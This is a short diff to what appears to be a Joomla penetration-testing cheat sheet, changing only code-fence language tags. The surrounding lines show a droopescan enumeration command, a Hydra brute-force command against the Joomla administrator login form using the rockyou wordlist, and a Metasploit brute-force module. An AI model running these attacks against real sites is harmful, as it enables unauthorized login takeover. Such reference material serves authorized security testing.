@@ -5,7 +5,7 @@
 ---
 ## Enumeration
 
-```
+```bash
 droopescan scan joomla --url http://<target>
 ```
 
@@ -16,7 +16,7 @@ Fingerprints Joomla version, installed extensions, and known vulnerabilities.
 
 **Hydra**
 
-```
+```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
 ```
 
@@ -24,7 +24,7 @@ Brute force Joomla admin login via Hydra. Adjust the form fields if the target u
 
 **Metasploit**
 
-```
+```bash
 msf> use auxiliary/scanner/http/joomla_bruteforce_login
 ```
 
